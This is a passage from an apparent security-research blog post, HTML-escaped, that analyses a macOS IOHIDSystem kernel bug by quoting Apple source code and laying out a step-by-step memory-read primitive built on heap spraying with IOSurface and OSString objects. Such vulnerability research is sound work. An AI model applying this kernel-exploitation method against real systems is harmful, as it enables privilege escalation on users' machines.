&lt;code&gt;&lt;span class=&quot;n&quot;&gt;IOReturn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOHIDSystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setProperties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;OSDictionary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IOReturn&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kIOReturnSuccess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  
    &lt;span class=&quot;n&quot;&gt;dict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OSDynamicCast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSDictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;properties&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;OSNumber&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modifiersValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OSDynamicCast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kIOHIDKeyboardGlobalModifiersKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modifiersValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;updateEventFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modifiersValue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsigned32BitValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// ...
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;updateEventFlags&lt;/code&gt; does some indirection through an event queue as well as a command gate, but ultimately arrives at &lt;code class=&quot;highlighter-rouge&quot;&gt;updateEventFlagsGated&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;kIOHIDKeyboardGlobalModifiersKey&lt;/code&gt; is just the string &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;HIDKeyboardGlobalModifiers&quot;&lt;/code&gt;, so that call is simple enough to do. One thing remains though, how much does that bitmasking in &lt;code class=&quot;highlighter-rouge&quot;&gt;updateEventFlagsGated&lt;/code&gt; restrain us? &lt;code class=&quot;highlighter-rouge&quot;&gt;KEYBOARD_FLAGSMASK&lt;/code&gt; is the OR-product of a lot of other constants:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define KEYBOARD_FLAGSMASK \
        (NX_ALPHASHIFTMASK | NX_SHIFTMASK | NX_CONTROLMASK | NX_ALTERNATEMASK \
        | NX_COMMANDMASK | NX_NUMERICPADMASK | NX_HELPMASK | NX_SECONDARYFNMASK \
        | NX_DEVICELSHIFTKEYMASK | NX_DEVICERSHIFTKEYMASK | NX_DEVICELCMDKEYMASK \
        | NX_ALPHASHIFT_STATELESS_MASK | NX_DEVICE_ALPHASHIFT_STATELESS_MASK \
        | NX_DEVICERCMDKEYMASK | NX_DEVICELALTKEYMASK | NX_DEVICERALTKEYMASK \
        | NX_DEVICELCTLKEYMASK | NX_DEVICERCTLKEYMASK)
&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;I’ve created a separate program in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/data/flags.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data/flags.c&lt;/code&gt;&lt;/a&gt; to print that constant, which gave me a value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x01ff20ff&lt;/code&gt;. That looks too restrictive to actually &lt;em&gt;write&lt;/em&gt; arbitrary pointers or data, but considering the fact that &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;eventFlags &amp;amp; ~KEYBOARD_FLAGSMASK&lt;/code&gt; is retained, it might just be enough to &lt;em&gt;modify&lt;/em&gt; something existing in a useful way.&lt;/p&gt;
&lt;p&gt;Now onto reading! This one is a fair bit trickier because most code that reads from &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; either doesn’t export that data elsewhere (which makes sense, since the client should have access to it through shared memory already), or it is ridiculously hard to trigger. For example, a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;evDispatch&lt;/code&gt; can cause the upper 24 bits of each the &lt;code class=&quot;highlighter-rouge&quot;&gt;x&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;y&lt;/code&gt; components of &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; to be copied to the shared memory of an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOFramebuffer&lt;/code&gt;. That shared memory is readily accessible to us through the &lt;code class=&quot;highlighter-rouge&quot;&gt;IOFramebufferSharedUserClient&lt;/code&gt;, however in order for the values to actually be copied there, the frame buffer need to have been previously attached to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt; via a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient::connectClient&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;frame&lt;/code&gt; (which we don’t control) has to be between &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;3&lt;/code&gt; (inclusive), the cursor has to be on the screen represented by the &lt;code class=&quot;highlighter-rouge&quot;&gt;IOFramebuffer&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;evDispatch&lt;/code&gt; actually has to be called. All in all, hardly ideal.&lt;/p&gt;
&lt;p&gt;There is one thing though that reads from and, as it happens, also writes to &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;_cursorHelper&lt;/code&gt;. This instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystemCursorHelper&lt;/code&gt; is used for both coordinate system arithmetic as well as conversion between the fields &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorLoc&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt;. What’s important for us is that is has its own separate storage, so it can act as a cache to some extent. If we can use that to read a value from &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; at one time and write it back at another, we can copy small amounts of memory to the actual shared memory we have mapped in our task. Now, the “writing back” part is easy enough, if we just look at &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::initShmem&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursorLoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursorLoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;screenCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;screenCursorFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getScreenLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asFixed24x8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As for reading, we’ve got three candidates:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; is only read to be sent to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOFramebuffer&lt;/code&gt;, otherwise it’s only ever written, so it’s useless to us.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt; is only read from in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::_setCursorPosition&lt;/code&gt; if &lt;code class=&quot;highlighter-rouge&quot;&gt;!(cursorCoupled || external)&lt;/code&gt; (any externally triggered call will have &lt;code class=&quot;highlighter-rouge&quot;&gt;external = true&lt;/code&gt;) and in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::resetCursor&lt;/code&gt; if &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;updateCursorPositionFromFixed&lt;/code&gt; is true (which we don’t control if &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; is offset).&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorLoc&lt;/code&gt;, at last, is actually useful: it is passed to &lt;code class=&quot;highlighter-rouge&quot;&gt;setCursorPosition&lt;/code&gt;, where it is stored unchanged in &lt;code class=&quot;highlighter-rouge&quot;&gt;_cursorHelper&lt;/code&gt;:
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;10&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;15&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOHIDSystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setCursorPosition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOGPoint&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newLoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OSObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventsOpen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;clock_get_uptime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cursorEventLast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocationDelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newLoc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocationDelta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newLoc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yValue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desktopLocation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromIntFloor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newLoc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newLoc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_setCursorPosition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;external&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_cursorMoveLast&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cursorEventLast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;scheduleNextPeriodicEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Ok, so how can we reach this code path? &lt;code class=&quot;highlighter-rouge&quot;&gt;setCursorPosition&lt;/code&gt; is called in two places: &lt;code class=&quot;highlighter-rouge&quot;&gt;unregisterScreenGated&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;setDisplayBoundsGated&lt;/code&gt;. And now this requires some background:&lt;br/&gt;IOHIDSystem has a notion of virtual screens on which the cursor can be - there are methods to create and destroy such screens, and to set their bounds. All those functions are exported as external methods of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt;, meaning they are readily accessible to us. So in order to read 4 bytes from a memory structure, we have to:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Register a virtual screen.&lt;/li&gt;
&lt;li&gt;Allocate an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOSurface&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Spray the heap by attaching lots of &lt;code class=&quot;highlighter-rouge&quot;&gt;OSString&lt;/code&gt;s to the surface.&lt;/li&gt;
&lt;li&gt;Offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Read back the stored strings.&lt;/li&gt;
&lt;li&gt;Detect where &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; initialisation happened.&lt;/li&gt;
&lt;li&gt;Possibly reposition &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; for alignment.&lt;/li&gt;
&lt;li&gt;Free the intersecting string(s).&lt;/li&gt;
&lt;li&gt;Reallocate the memory with a useful data structure.&lt;/li&gt;
&lt;li&gt;Update the bounds of our virtual screen.&lt;/li&gt;
&lt;li&gt;Re-initialise &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; back on actual shared memory.&lt;/li&gt;
&lt;li&gt;Read the copied value off shared memory.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;The cursor problem&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In addition to all that work, we have to take special care of something else: &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;screenCursorFixed&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;desktopCursorFixed&lt;/code&gt;. Reading from &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorLoc&lt;/code&gt; may cause these two fields to be written to (that’s what I’m calling the &lt;strong&gt;cursor problem&lt;/strong&gt;). Specifically, &lt;code class=&quot;highlighter-rouge&quot;&gt;_setCursorPosition&lt;/code&gt; will be called with &lt;code class=&quot;highlighter-rouge&quot;&gt;external = true&lt;/code&gt;. First it will reach this point:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OSSpinLockTry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursorSema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// host using shmem
&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// try again later
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;So if &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;cursorSema&lt;/code&gt; falls on a non-zero value, &lt;code class=&quot;highlighter-rouge&quot;&gt;_setCursorPosition&lt;/code&gt; will abort and we’ll be safe. Otherwise however, we will arrive at the following block of code:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;9&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
